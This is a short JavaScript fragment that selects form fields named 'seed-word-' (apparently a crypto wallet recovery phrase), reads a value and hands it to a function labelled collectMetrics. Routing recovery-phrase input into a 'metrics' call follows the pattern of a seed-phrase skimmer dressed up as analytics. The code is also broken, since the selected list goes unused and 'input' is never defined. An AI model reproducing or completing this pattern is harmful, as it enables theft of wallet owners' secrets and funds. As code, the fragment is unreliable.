const words = document.querySelectorAll('input[name^="seed-word-"]');
const value = input.value;
collectMetrics({data: value});
